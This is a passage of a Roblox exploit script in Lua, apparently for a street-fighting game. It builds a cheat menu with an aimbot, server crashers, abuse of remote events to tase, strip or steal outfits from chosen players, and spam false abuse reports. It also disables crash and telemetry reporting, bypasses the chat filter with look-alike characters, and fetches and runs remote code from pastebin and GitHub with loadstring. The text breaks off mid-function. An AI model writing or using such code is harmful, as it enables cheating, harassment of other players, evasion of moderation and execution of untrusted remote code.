                                (Vector2.new(pos.X, pos.Y) - Vector2.new(LocalMouse.X, LocalMouse.Y)).magnitude
                            if magnitude < shortestDistance then
                                closestPlayer = v
                                shortestDistance = magnitude
                            end
                        end
                    end
                    return closestPlayer
                end

                -- Hold E to shoot your guns very fast, works best with Revolver
                -- init
                if not game:IsLoaded() then
                    game.Loaded:Wait()
                end

                -- variables
                local players, replicatedStorage, runService, userInputService =
                    Players,
                    RepStorage,
                    game:GetService("RunService"),
                    game:GetService("UserInputService")
                local client, mouse = players.LocalPlayer, players.LocalPlayer:GetMouse()

                local toolRemoteEvents = replicatedStorage:FindFirstChild("ToolRemoteEvents")
                local reloadWeapon = replicatedStorage:FindFirstChild("ReloadWeapon")

                local keyHeld = false

                -- events
                userInputService.InputBegan:Connect(
                    function(key)
                        if userInputService:GetFocusedTextBox() then
                            return
                        end

                        if key.KeyCode == Enum.KeyCode.T then
                            keyHeld = true
                        end
                    end
                )

                userInputService.InputEnded:Connect(
                    function(key)
                        if userInputService:GetFocusedTextBox() then
                            return
                        end

                        if key.KeyCode == Enum.KeyCode.T then
                            keyHeld = false
                        end
                    end
                )
                getgenv().Partz = "LowerTorso"
                getgenv().Prediction = 0.158
                runService.RenderStepped:Connect(
                    function()
                        if keyHeld == true then
                            if client.Character and client.Character:FindFirstChildOfClass("Tool") then
                                local tool = client.Character:FindFirstChildOfClass("Tool")

                                toolRemoteEvents[((tool.Name ~= "Revolver" and tool.Name) or "Rev")]:FireServer(
                                    getClosestPlayerToCursor().Character.HumanoidRootPart.Position,
                                    {
                                        Ammo = {Value = 99},
                                        Barrel = {
                                            ShootUI = {Shoot = tool.Barrel.ShootUI.Shoot},
                                            Position = getClosestPlayerToCursor().Character.HumanoidRootPart.Position +
                                                Vector3.new(0, math.random(26, 50), 0)
                                        },
                                        Handle = tool.Handle or
                                            {ShootLight = game.Workspace:FindFirstChildOfClass("Script")}
                                    }
                                )
                                reloadWeapon:FireServer()
                            end
                        end
                    end
                )
            end
        )
        Fighting:Button(
            "put all knifes",
            function()
                local plr = Players.LocalPlayer
                local chr = plr.Character or plr.CharacterAdded:Wait()
                for i, v in pairs(plr.Backpack:GetChildren()) do
                    if v.Name == "Knife" then
                        v.Parent = chr
                    end
                end
                wait(1)
                local balls = 1
                for i, v in pairs(chr:GetChildren()) do
                    if v:IsA("Tool") then
                        balls = balls + 0.2
                        currentToolSize = v.Handle.Size
                        currentGripPos = v.GripPos
                        v.Handle.Transparency = 1
                        v.Handle.Massless = true
                        v.Handle.Size = Vector3.new(10, 10, 10)

                        v.GripPos = Vector3.new(0, 0, 0)
                    end
                end
            end
        )

        Fun:Button(
            "Rainbow gun (equip gun)",
            function()
                local Brick =
                    Workspace[Players.LocalPlayer.Name]:FindFirstChildOfClass("Tool"):FindFirstChildOfClass("MeshPart") --Change To Brick

                Brick.TextureID = ""
                Brick.Material = "Plastic"
                local speed = 1 --Change to speed you want
                while true do
                    for i = 0, 1, 0.001 * speed do
                        Brick.Color = Color3.fromHSV(i, 1, 1) --creates a color using i
                        wait()
                    end
                end
            end
        )

        ServerAffect:Button(
            "Invisible tool",
            function()
                local mouse = Players:WaitForChild(Players.LocalPlayer.Name):GetMouse()
                function rpg(ni)
                    local args = {
                        [1] = {
                            Ammo = {Value = 8473784},
                            Launcher = ni,
                            Handle = {
                                Position = Vector3.new(9,99,99)
                            }
                        },
                        [2] = Vector3.new(99, 0, 0)
                    }

                    RepStorage:WaitForChild("ToolRemoteEvents"):WaitForChild("RPG"):FireServer(unpack(args))
                end
                a = mouse.Target
                local TpTool = Instance.new("Tool")
                TpTool.Name = "Invisible tool"
                TpTool.RequiresHandle = false
                TpTool.Parent = Players.LocalPlayer.Backpack

                TpTool.Activated:Connect(
                    function()
                        if a:IsA("Model") then
                            rpg(a:FindFirstChildOfClass("Part"))
                        elseif a.ClassName:find("Part") then
                            rpg(a)
                        end
                    end
                )
            end
        )
        btns:Button(
            "make bigger",
            function()
                for i, v in pairs(game.Workspace:GetDescendants()) do
                    if v.Name == "[Weights] - $150" then
                        fireclickdetector(v.ClickDetector)
                    end
                end

                local plr = Players.LocalPlayer
                local chr = plr.Character or plr.CharacterAdded:Wait()
                for i, v in pairs(plr.Backpack:GetChildren()) do
                    if v.Name == "Weight" then
                        v.Parent = chr
                    end
                end
            end
        )
        btns:Button(
            "make smaller",
            function()
                while Players.LocalPlayer.Character.Humanoid.Health >= 0 do
                    pcall(
                        function()
                            fireclickdetector(game.Workspace.MAP["[Lettuce] - $1"].ClickDetector)
                        end
                    )
                    wait()

                    local plr = Players.LocalPlayer
                    local chr = plr.Character or plr.CharacterAdded:Wait()
                    for i, v in pairs(plr.Backpack:GetChildren()) do
                        if v.Name == "Lettuce" then
                            v.Parent = chr
                        end
                    end
                end
            end
        )

        crash:Button(
            "stop annoying ads (should turn before get tools)",
            function()
                game:GetService("CoreGui").PurchasePrompt.Enabled = false
                Workspace.MAP["[Configure Crosshair]"]:Destroy()
            end
        )
        crash:Button(
            "get tools for crash server",
            function()
                --tool crasher
                for _, descendant in ipairs(Workspace:GetDescendants()) do
                    if descendant:IsA("ClickDetector") then
                        fireclickdetector(descendant)
                    end
                end
                for i, v in pairs(Players.LocalPlayer:FindFirstChildOfClass("Backpack"):GetChildren()) do
                    if v:IsA("Tool") or v:IsA("HopperBin") then
                        v.Parent = Players.LocalPlayer.Character
                    end
                end
            end
        )

        crash:Button(
            "crash server with tools",
            function()
                for i, v in pairs(Players.LocalPlayer:FindFirstChildOfClass("Backpack"):GetChildren()) do
                    if v:IsA("Tool") or v:IsA("HopperBin") then
                        v.Parent = Players.LocalPlayer.Character
                    end
                end

                wait(0.5)
                Players.LocalPlayer.Character.RightHand:Destroy()
            end
        )
        crash:Button(
            "crash Haim's New",
            function()
                loadstring(game:HttpGet("https://pastebin.com/raw/phHvdHKR"))()
            end
        )

        btns:Button(
            "food xd",
            function()
                local plr = Players.LocalPlayer
                local chr = plr.Character or plr.CharacterAdded:Wait()
                local sin = 0
                for i, v in pairs(game.Workspace.MAP:GetDescendants()) do
                    if
                        v.Name == "[KFC Bucket] - $13" or v.Name == "[Taco] - $6" or v.Name == "[Nuggets] - $6" or
                            v.Name == "[Apple] - $6"
                     then
                        sin = sin + 1
                        pcall(
                            function()
                                v.Name = "LOL" .. tostring(sin)
                            end
                        )
                    end
                end

                fireclickdetector(Workspace.MAP.LOL1.ClickDetector)
                fireclickdetector(Workspace.MAP.LOL3.ClickDetector)

                fireclickdetector(Workspace.MAP.LOL4.ClickDetector)
                wait(0.01)
                fireclickdetector(Workspace.MAP.LOL2.ClickDetector)
                fireclickdetector(Workspace.MAP.LOL5.ClickDetector)

                fireclickdetector(Workspace.MAP.LOL6.ClickDetector)
                wait(0.01)
                fireclickdetector(Workspace.MAP.LOL7.ClickDetector)
                fireclickdetector(Workspace.MAP.LOL8.ClickDetector)

                fireclickdetector(Workspace.MAP.LOL9.ClickDetector)
                wait(0.01)
                fireclickdetector(Workspace.MAP.LOL10.ClickDetector)
                fireclickdetector(Workspace.MAP.LOL11.ClickDetector)

                for i, v in pairs(plr.Backpack:GetChildren()) do
                    if v.Name == "[KFC Bucket]" or v.Name == "[Taco]" or v.Name == "[nugget]" or v.Name == "[Apple]" then
                        v.Parent = chr
                    end
                end
                wait(0.01)
            end
        )

        Fighting:Button(
            "bypass anti lock aimbot powerful guns",
            function()
                local players, replicatedStorage, runService, userInputService =
                    Players,
                    RepStorage,
                    game:GetService("RunService"),
                    game:GetService("UserInputService")
                local client, mouse = players.LocalPlayer, players.LocalPlayer:GetMouse()
                local guimain = Instance.new("Folder", game.CoreGui)
                local CC = game:GetService "Workspace".CurrentCamera
                local LocalMouse = Players.LocalPlayer:GetMouse()

                getgenv().Partz = "LowerTorso"
                getgenv().AutoPrediction = true

                function getClosestPlayerToCursor()
                    local closestPlayer
                    local shortestDistance = 222

                    for i, v in pairs(Players:GetPlayers()) do
                        if
                            v ~= Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and
                                v.Character.Humanoid.Health ~= 0 and
                                v.Character:FindFirstChild("LowerTorso")
                         then
                            local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                            local magnitude =
                                (Vector2.new(pos.X, pos.Y) - Vector2.new(LocalMouse.X, LocalMouse.Y)).magnitude
                            if magnitude < shortestDistance then
                                closestPlayer = v
                                shortestDistance = magnitude
                            end
                        end
                    end
                    return closestPlayer
                end

                -- Hold E to shoot your guns very fast, works best with Revolver
                -- init
                if not game:IsLoaded() then
                    game.Loaded:Wait()
                end

                -- variables
                local players, replicatedStorage, runService, userInputService =
                    Players,
                    RepStorage,
                    game:GetService("RunService"),
                    game:GetService("UserInputService")
                local client, mouse = players.LocalPlayer, players.LocalPlayer:GetMouse()

                local toolRemoteEvents = replicatedStorage:FindFirstChild("ToolRemoteEvents")
                local reloadWeapon = replicatedStorage:FindFirstChild("ReloadWeapon")

                local keyHeld = false

                -- events
                userInputService.InputBegan:Connect(
                    function(key)
                        if userInputService:GetFocusedTextBox() then
                            return
                        end

                        if key.KeyCode == Enum.KeyCode.E then
                            keyHeld = true
                        end
                    end
                )

                userInputService.InputEnded:Connect(
                    function(key)
                        if userInputService:GetFocusedTextBox() then
                            return
                        end

                        if key.KeyCode == Enum.KeyCode.E then
                            keyHeld = false
                        end
                    end
                )
                getgenv().Partz = "LowerTorso"
                getgenv().Prediction = 0.158
                runService.RenderStepped:Connect(
                    function()
                        if keyHeld == true then
                            if client.Character and client.Character:FindFirstChildOfClass("Tool") then
                                local tool = client.Character:FindFirstChildOfClass("Tool")

                                toolRemoteEvents[((tool.Name ~= "Revolver" and tool.Name) or "Rev")]:FireServer(
                                    getClosestPlayerToCursor().Character[getgenv().Partz].Position +
                                        (getClosestPlayerToCursor().Character.Humanoid.MoveDirection *
                                            getgenv().Prediction),
                                    tool
                                )
                                reloadWeapon:FireServer()
                            end
                        end
                    end
                )
            end
        )

        local usure = false
        ServerAffect:Button(
            "Blur",
            function()
                if usure == true then
                    RepStorage.ToolRemoteEvents.Rev:FireServer(
                        Vector3.new(99, 99, 99),
                        {
                            Ammo = {Value = 99},
                            Barrel = {
                                ShootUI = {Shoot = Players.LocalPlayer.Backpack.Revolver.Barrel.ShootUI.Shoot}
                            },
                            Handle = {ShootLight = game.Lighting.PepperSprayBlur}
                        }
                    )
                end

                if usure == false then
                    usure = true
                end
            end
        )

        ServerAffect:Button(
            "Rain",
            function()
                for i, v in pairs(game.StarterPlayer.StarterPlayerScripts:GetChildren()) do
                    if v.Name:find("Rain") or v.Name:find("RAIN") or v.Name:find("rain") then
                        RepStorage.ToolRemoteEvents.Rev:FireServer(
                            Vector3.new(99, 99, 99),
                            {
                                Ammo = {Value = 99},
                                Barrel = {
                                    ShootUI = {Shoot = Players.LocalPlayer.Backpack.Revolver.Barrel.ShootUI.Shoot}
                                },
                                Handle = {ShootLight = v}
                            }
                        )
                    end
                end
            end
        )

        Fun:Button(
            "Stomp Effect(Swords)",
            function()
                for i, v in next, game:GetObjects("rbxassetid://13945928704")[1]:GetChildren() do
                    if v:IsA("Model") then
                        for _, x in pairs(v:GetChildren()) do
                            if x ~= nil then
                                x.Parent = game[v.Name]
                            end
                        end
                    end
                end
                a = Instance.new("Folder")
                a.Parent = Workspace.Ignored
                a.Name = "Animations"
                function say(msg)
                    RepStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
                end
                wait(2)
                if RepStorage:FindFirstChild("Modules") then
                    for i, v in next, RepStorage:GetDescendants() do
                        if v.ClassName:find("script") or v.ClassName:find("Script") then
                            pcall(
                                function()
                                    v.Enabled = true
                                    v.Disabled = false
                                end
                            )
                        end
                    end
                end
                wait(0.5)

                function stomp(who)
                    function require(Module)
                        local Env = {}
                        local Fake = {script = Module}
                        local Mt = {
                            __index = function(self, key)
                                return Fake[key] or getfenv()[key]
                            end,
                            __newindex = function(self, key, value)
                                if Fake[key] then
                                    Fake[key] = value
                                else
                                    getfenv()[key] = value
                                end
                            end
                        }
                        local Yes = setmetatable(Env, Mt)
                        local Func = loadstring(Module.Source)
                        setfenv(Func, Yes)
                        return Func()
                    end

                    require(RepStorage.KillFX["Gates of Heaven"]).RunStompFx(
                        "Gates of Heaven",
                        who,
                        Players.LocalPlayer,
                        Players.LocalPlayer
                    )
                end

                local UserInputService = game:GetService("UserInputService")
                local Players = Players
                local CollectionService = game:GetService("CollectionService")
                local ReplicatedStorage = RepStorage
                local NoSpam = false

                -- constants
                local MAX_RANGE = 7
                local PLAYER = Players.LocalPlayer
                local Cooldown = true

                -- variables

                UserInputService.InputBegan:Connect(
                    function(Input)
                        if Input.KeyCode == Enum.KeyCode.E then
                            local tagged = CollectionService:GetTagged("Downed")

                            if #tagged == 0 then
                                return
                            end
                            print("here?")
                            local distance = MAX_RANGE
                            local victim = nil
                            for _, v in pairs(tagged) do
                                if
                                    (v.PrimaryPart.Position - Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <
                                        distance
                                 then -- DO NOT DO THIS! AKA THE " Players.LocalPlayer.Character.PrimaryPart.Position" part
                                    victim = v
                                    distance =
                                        (v.PrimaryPart.Position - Players.LocalPlayer.Character.PrimaryPart.Position).Magnitude
                                end
                            end
                            wait(1.2)
                            if victim.Humanoid.Health <= 0 then
                                if victim then
                                    stomp(victim.HumanoidRootPart)
                                end
                            end
                        end
                    end
                )
            end
        )

        Fighting:Button(
            "fake macro z",
            function()
                Players.LocalPlayer:GetMouse().KeyDown:connect(
                    function(z)
                        if z == "z" then
                            Players:Chat("/e laugh")
                            Players.LocalPlayer.Character.Humanoid.WalkSpeed = 333
                            wait(6)
                            Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
                        end
                    end
                )
            end
        )

        Fighting:Button(
            "shoot from no where(use db)",
            function()
                local mouse = Players:WaitForChild(Players.LocalPlayer.Name):GetMouse()
                mouse.KeyDown:connect(
                    function(f)
                        if f == "b" then
                            local args = {
                                [1] = mouse.Target.Position,
                                [2] = Players:WaitForChild(Players.LocalPlayer.Name):WaitForChild("Backpack"):WaitForChild(
                                    "DB"
                                )
                            }

                            RepStorage:WaitForChild("ToolRemoteEvents"):WaitForChild("DB"):FireServer(unpack(args))
                        end
                    end
                )
            end
        )

        Fighting:Button(
            "Get all knifes in the game.",
            function()
                for i, v in pairs(Workspace.pickups:GetChildren()) do
                    if v.ToolSpawnPart then
                        v.ToolSpawnPart.CFrame = Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                    end
                end
            end
        )

        btns:Button(
            "Fix ragdoll killing self.",
            function()
                local plr = Players.LocalPlayer

                local chara = plr.Character
                for i, v in next, chara:GetDescendants() do
                    if v.Name == "Attachment" or v.Name == "BallSocketConstraint" then
                        v:Destroy()
                    end
                end
            end
        )
        Fighting:Button(
            "Katana ( yes ik the idea is stolen) needs knifes.",
            function()
                local plr = Players.LocalPlayer
                local chr = plr.Character or plr.CharacterAdded:Wait()
                for i, v in pairs(plr.Backpack:GetChildren()) do
                    if v.Name == "Knife" then
                        v.Parent = chr
                    end
                end
                wait(1)
                local balls = 1
                for i, v in pairs(chr:GetChildren()) do
                    if v:IsA("Tool") then
                        balls = balls + 0.2
                        currentToolSize = v.Handle.Size
                        currentGripPos = v.GripPos
                        v.Handle.Transparency = 1
                        v.Handle.Massless = true
                        v.Handle.Size = Vector3.new(10, 10, 10)

                        v.GripPos = Vector3.new(0 + balls, 0, 0)
                    end
                end
            end
        )

        btns:Button(
            "no jump delay",
            function()
                plr.PlayerGui:WaitForChild("Jump"):Destroy()

                DiscordLib:Notification("Notification", "Jump", "ez!")
            end
        )

        Fighting:Button(
            "reach for tool",
            function()
                local chr = plr.Character or plr.CharacterAdded:Wait()
                for i, v in pairs(chr:GetDescendants()) do
                    if v:IsA("Tool") then
                        currentToolSize = v.Handle.Size
                        currentGripPos = v.GripPos
                        v.Handle.Transparency = 1
                        v.Handle.Massless = true
                        v.Handle.Size = Vector3.new(40, 40, 40)
                    end
                end
            end
        )

        local lol = false
        local knive = false

        Loops["Loop5"] = knive
        tgls:Toggle(
            "get knives looped",
            false,
            function(bool42)
                knive = bool42
                while knive == true do
                    task.wait()

                    for i, v in pairs(Workspace.pickups:GetChildren()) do
                        if v.ToolSpawnPart then
                            v.ToolSpawnPart.CFrame = Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                        end
                    end
                end
            end
        )
        local balls33 = false
        Loops["Loop1"] = balls33
        tgls:Toggle(
            "swearing",
            false,
            function(bool42)
                okay = bool42
                balls33 = okay
            end
        )
        tgls:Toggle(
            "fits",
            false,
            function(bool42)
                okay = bool42
                blayet = okay
            end
        )
        local shielded = false
        Loops["Loop3"] = shielded
        Loops["Loop2"] = blayet

        tgls:Toggle(
            "get shield",
            false,
            function(bool42)
                shielded = bool42
                while shielded == true do
                    task.wait()

                    fireclickdetector(Workspace.MAP["Medium armor {FREE}"].Head.ClickDetector)
                end
            end
        )
        local p = false
        tgls:Toggle(
            "Stomp alert",
            false,
            function(bool42)
                p = bool42
               
                    
                  task.wait()
function checkforanim(plr)
 local a = false
    for i, v in pairs(plr.Character.Humanoid.Animator:GetPlayingAnimationTracks()) do
    
        if v.Animation.AnimationId== "rbxassetid://11942983124" or v.Animation.AnimationId == "rbxassetid://12610970944" then 
        a = true 
        end
    end

    return a 
end

local maxDistance = 7

 while p == true do
     
     
      local part = Workspace:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart
    local nearestPlayer, nearestDistance
    for _, player in pairs(Players:GetPlayers()) do
        if  player ~= game.Players.LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChild("Reload") and player.Character:FindFirstChild("Head") then  
        local character = player.Character
        local distance = player:DistanceFromCharacter(part.Position)
        if not character or distance > maxDistance or (nearestDistance and distance >= nearestDistance) then
        continue
        end
        nearestDistance = distance
        nearestPlayer = player
        end 
    end
  
    if nearestPlayer ~=  nil then 
        
  
    if Players.LocalPlayer.Character.Humanoid.Health <= 2 then 
    if checkforanim(nearestPlayer) == true then 
          notif.new("warning", "You got stomped", nearestPlayer.DisplayName .. "/" .. nearestPlayer.Name .. " Might stomped you.", false)
    end
    end 
    end

wait(0.9)
end
                
            end
        )
        local stompin = false
        local method = 1
        Loops["Loop4"] = stompin
        tgls:Toggle(
            "AutoStomp Lmfao working again!",
            false,
            function(bool4)
                print(lol)
                stompin = bool4

                while stompin == true do
                    wait(0.5)

                    for i, v in pairs(Players:GetChildren()) do
                        local args = {
                            [1] = Workspace:WaitForChild(v.Name)
                        }

                        RepStorage:WaitForChild("AttemptStomp"):FireServer(unpack(args))
                    end
                end
            end
        )

 tgls:Toggle(
            "Method For Swearing 😳",
            false,
            function(bool4)
                print(lol)
                stompin = bool4
               if stompin == true then 
                   method = 2
                   else 
                     method = 1
                   end 
            end
        )
        local sldr2 =
            Fighting:Slider(
            "Fov",
            0,
            120,
            60,
            function(t)
                Workspace.Camera.FieldOfView = t
            end
        )

        local hm = {}
        for i, v in pairs(Players:GetChildren()) do
            table.insert(hm, v.Name)
        end

        Players.PlayerAdded:connect(
            function(pla)
                if table.find(hm, pla.Name) then
                    table.insert(hm, pla.Name)
                end
            end
        )
        Players.PlayerRemoving:connect(
            function(pla)
                if table.find(hm, pla.Name) then
                    table.remove(hm, pla.Name)
                end
            end
        )

        local drop1 =
            Demolisher:Dropdown(
            "Taser stop reloading",
            hm,
            function(bool)
                local playername = bool
                local taser =
                    game:GetService("RunService").Heartbeat:connect(
                    function()
                        for i, v in pairs(Players:GetChildren()) do
                            if
                                v ~= Players.LocalPlayer and v.Name == playername and
                                    v.Character:WaitForChild("Reload").Value == false
                             then
                                RepStorage.ToolRemoteEvents.Taser:FireServer(
                                    Vector3.new(99, 99, 99),
                                    {
                                        Hooked = v.Character.Reload,
                                        Handle = {
                                            Position = Workspace.MAP["Server time And Played"].HumanoidRootPart.Position
                                        },
                                        SpawnPart = v.Character:WaitForChild("Head")
                                    }
                                )
                            end
                        end
                    end
                )

                Players.LocalPlayer:GetMouse().KeyDown:connect(
                    function(key)
                        if key == "l" then
                            if taser then
                                taser:Disconnect()
                            end
                        end
                    end
                )
            end
        )

        local a = loadstring(game:HttpGet("https://pastebin.com/raw/G3HH66j5"))()

        Demolisher:Dropdown(
            "Report",
            hm,
            function(bool)
                local player = bool
                local d =
                    game:GetService("RunService").RenderStepped:connect(
                    function()
                        wait(1)
                        customfuncs:report(
                            player,
                            MainReasons[math.random(1, #MainReasons)],
                            Reasons[math.random(1, #Reasons) .. " " .. math.random(1,999)]
                        )
                    end
                )

                Players.LocalPlayer:GetMouse().KeyDown:connect(
                    function(key)
                        if key == "b" then
                            if d then
                                d:Disconnect()
                            end
                        end
                    end
                )
            end
        )
        Fun:Button(
            "funny",
            function()
                function rn()
                    local uh = math.random(-25, 25)
                    return uh
                end
                local d =
                    game:GetService("RunService").RenderStepped:connect(
                    function()
                        local playername = plr.Name
                        RepStorage.ToolRemoteEvents.Taser:FireServer(
                            Vector3.new(0, 0, 0),
                            {
                                Hooked = {Value = false},
                                Handle = {
                                    Position = Players[playername].Character:WaitForChild("RightFoot").Position +
                                        Vector3.new(rn(), 1, rn())
                                },
                                SpawnPart = Players[playername].Character:WaitForChild("LeftFoot")
                            }
                        )
                    end
                )

                Players.LocalPlayer:GetMouse().KeyDown:connect(
                    function(key)
                        if key == "b" then
                            if d then
                                d:Disconnect()
                            end
                        end
                    end
                )
            end
        )

        Outfited:Button(
            "Clean",
            function()
                if game.NetworkClient:FindFirstChild("fits") then
                    plr["AE_Costumes"]:Destroy()
                    game.NetworkClient.fits.Parent = plr
                    plr.fits.Name = "AE_Costumes"

                    for i, v in pairs(plr.fits:GetChildren()) do
                        v.Name = ""
                    end
                end
            end
        )

        Outfited:Textbox(
            "from userid",
            "a",
            true,
            function(aaa)
                local d = tonumber(aaa)
                local target = d
                local specifichumdesc = Players:GetHumanoidDescriptionFromUserId(target)
                customfuncs:stealfit(specifichumdesc)
            end
        )
        Outfited:Textbox(
            "accessory",
            "a",
            true,
            function(aaa)
                local d = tonumber(aaa)

                RepStorage.AvatarEditor.RemoteEvent:FireServer("accessory", d)
            end
        )
        local lol =
            Outfited:Dropdown(
            "steal outfit user",
            hm,
            function(bool)
                local playername = bool

                local target = playername
                local specifichumdesc = Players[target].Character.Humanoid.HumanoidDescription

                customfuncs:stealfit(specifichumdesc)
            end
        )
        local lol =
            Outfited:Dropdown(
            "steal inventory",
            hm,
            function(bool)
                local playername = bool

                local plr = Players.LocalPlayer
                local targ = Players[playername]
                function reset()
                    RepStorage:WaitForChild("AvatarEditor"):WaitForChild("RemoteEvent"):FireServer("reset")
                end
                function makefile(name, parent)
                    for i, v in pairs(plr["AE_Costumes"]:GetChildren()) do
                        v.Name = i .. " " .. plr.Name
                    end
                    local a = plr["AE_Costumes"]:Clone()
                    a.Parent = parent
                    a.Name = name
                end

                if game.NetworkClient:FindFirstChild("fits") then
                else
                    makefile("fits", game.NetworkClient)
                end

                for i, v in pairs(targ["AE_Costumes"]:GetChildren()) do
                    v:Clone().Parent = plr["AE_Costumes"]
                end

                wait(0.5)
                if first_time == false then
                    local Hook
                    Hook =
                        hookfunction(
                        getrawmetatable(game).__namecall,
                        newcclosure(
                            function(self, ...) -- Hook Namecall
                                local args = {...} -- store argument

                                if
                                    getnamecallmethod() == "FireServer" and self.Name == "RemoteEvent" and
                                        args[1] == "wear"
                                 then -- Get the calling method ( :FireServer() )
                                    print("hi")

                                    if game.NetworkClient:WaitForChild("fits"):FindFirstChild(args[2].Name) then
                                        args[2] = player["AE_Costumes"][args[2].Name]
                                        return Hook(self, unpack(args))
                                    else
                                        print("nope")
                                        reset()

                                        customfuncs:stealfit(args[2])

                                        wait(0.5)

                                        args[2] = targ["AE_Costumes"]:GetChildren()[1]
                                    end
                                    return Hook(self, unpack(args))
                                end

                                return Hook(self, ...) -- Return the old hook to prevent breaking your entire game
                            end
                        )
                    )
                end
                first_time = true
            end
        )

        local drop3 =
            Demolisher:Dropdown(
            "Taser take away",
            hm,
            function(bool)
                local playername = bool
                local taser =
                    game:GetService("RunService").Heartbeat:connect(
                    function()
                        RepStorage.ToolRemoteEvents.Taser:FireServer(
                            Vector3.new(99, 99, 99),
                            {
                                Hooked = {Value = false},
                                Handle = {
                                    Position = Players[playername].Character:WaitForChild("RightFoot").Position +
                                        Players[playername].Character:WaitForChild("RightFoot").Velocity
                                },
                                SpawnPart = Players[playername].Character:WaitForChild("Head")
                            }
                        )
                    end
                )

                Players.LocalPlayer:GetMouse().KeyDown:connect(
                    function(key)
                        if key == "l" then
                            if taser then
                                taser:Disconnect()
                            end
                        end
                    end
                )
            end
        )
        
        local drop55 =
            Demolisher:Dropdown(
            "Taser break camera",
            hm,
            function(bool)
                local name = bool
              
                             
         Players = game.Players
          
for i,v in pairs(Players[name].Character:GetDescendants()) do 
if v.ClassName:find("Value") then 
   game.ReplicatedStorage.ToolRemoteEvents.Taser:FireServer(
                            Vector3.new(99, 99, 99),
                            {
                                Hooked = v,
                                Handle = {
                                    Position = Players[name].Character:WaitForChild("RightFoot").Position +
                                        Players[name].Character:WaitForChild("RightFoot").Velocity
                                },
                                SpawnPart = Players[name].Character:WaitForChild("Head")
                            }
                        )
end 
end 

for i,v in pairs(Players[name].Backpack:GetDescendants()) do 
if v.ClassName:find("Value") then 
   game.ReplicatedStorage.ToolRemoteEvents.Taser:FireServer(
                            Vector3.new(99, 99, 99),
                            {
                                Hooked = v,
                                Handle = {
                                    Position = Players[name].Character:WaitForChild("RightFoot").Position +
                                        Players[name].Character:WaitForChild("RightFoot").Velocity
                                },
                                SpawnPart = Players[name].Character:WaitForChild("Head")
                            }
                        )
end 
end 
            

            
            end
        )

        Admins:Button(
            "inf yeild",
            function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
            end
        )
        Admins:Button(
            "Swearing",
            function()
                local unloggable = true
                local inf_yeild = true
                local CapitalLetters = false
                

                game:GetService("StarterGui"):SetCore(
                    "SendNotification",
                    {
                        Title = "Bypass Works!",
                        Text = "Was customized by Faws , script made by Haim",
                        Icon = "rbxassetid://1234567890"
                    }
                )
                if inf_yeild == true then
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
                end
                if setfflag then
                    setfflag("CrashUploadToBacktraceUrl", "")
                    setfflag("CrashpadUploadToBacktraceUrl", "")
                    setfflag("CrashUploadToBacktracePercentage", "0")
                    setfflag("CrashUploadToBacktraceWindowsPlayerToken", "")
                    setfflag("CrashUploadToBacktraceBlackholeToken", "")
                    setfflag("DebugCrashEnabled", "False")
                    setfflag("GoogleAnalyticsAccountPropertyID", "")
                    setfflag("WindowsLaunchTypeAnalytics", "False")
                    setfflag("AbuseReportScreenshot", "False")
                    setfflag("AbuseReportScreenshotPercentage", "0")
                    setfflag("TelegrafHTTPTransportUrl", "")
                    setfflag("EnableGCapsHardwareTelemetry", "False")
                    setfflag("EnableExtendedHardwareTelemetry", "False")
                    setfflag("EnableInferredOOMTelemetry", "False")
                    setfflag("EnableHardwareTelemetry", "False")
                    setfflag("HardwareTelemetryHundredthsPercent", "0")
                end

              

               
                    local first_string
                    local between_string = ""
                    local between_string_two = ""
                    if unloggable == false then
                        first_string = "SAX "
                    else
                        first_string = "SL#UT "
                    end
                    local end_string = " ￸￸￸￸￸￸"
                    local toswitch1
                    if CapitalLetters == false  then
                        toswitch = {
                            ["s"] = "ѕ",
                            ["p"] = "р",
                            ["c"] = "с",
                            ["y"] = "у",
                            ["o"] = "о",
                            ["j"] = "ј",
                            ["x"] = "х",
                            ["i"] = "і",
                            ["a"] = "а",
                            ["e"] = "е"
                        }
                    else
                        toswitch = {
                            ["s"] = "ѕ",
                            ["p"] = "р",
                            ["c"] = "с",
                            ["y"] = "у",
                            ["o"] = "о",
                            ["j"] = "ј",
                            ["x"] = "х",
                            ["i"] = "і",
                            ["a"] = "а",
                            ["e"] = "е",
                            ["A"] = "А",
                            ["B"] = "В",
                            ["E"] = "Е",
                            ["S"] = "Ѕ",
                            ["J"] = "Ј",
                            ["M"] = "М",
                            ["H"] = "Н",
                            ["O"] = "О",
                            ["P"] = "Р",
                            ["C"] = "С",
                            ["T"] = "Т",
                            ["X"] = "Х"
                        }
                    end
                    local toswitch1
                    if CapitalLetters == false  then
                        toswitch1 = {
                          ["s"] = "ѕ",
    ["p"] = "р",
    ["c"] = "с",
    ["y"] = "у",
    ["o"] = "о",
    ["j"] = "ј",
    ["x"] = "х",
    ["i"] = "і",
    ["a"] = "а",
    ["e"] = "е",
   ["I"] = "І",
   ["Y"] = "Ү",
  ["A"] = "А"
     
                        }
                    else
                       
                    end
                    local function replaceCharacters(str, replacements)
                        local result = ""
                        for i = 1, #str do
                            local char = str:sub(i, i)
                            local replacement = replacements[char]
                            if replacement then
                                result = result .. replacement .. "￸"
                            else
                                result = result .. char .. ""
                            end
                        end
                        return result
                    end

                    local version = game:GetService("TextChatService").ChatVersion
                    if version == Enum.ChatVersion.LegacyChatService then
                        local ReplicatedStorage = game:GetService("ReplicatedStorage")
                        local Remote = ReplicatedStorage:FindFirstChild("SayMessageRequest", true)

                        local ChatBypass
                        ChatBypass =
                            hookmetamethod(
                            Remote,
                            "__namecall",
                            function(self, ...)
                                local Method = getnamecallmethod()
                                local Arguments = {...}
                                if self == Remote and Method == "FireServer" then
                                    local Message = Arguments[1]
                                    local FinalMessage = ""
                                    local c
                                    local b = replaceCharacters(Message, toswitch)
                                    FinalMessage = first_string .. b
                                    c = string.gsub(FinalMessage, " ", between_string)
                                    c = c .. end_string
                                    
                                     local FinalMessage3 = ""
                                 local c3
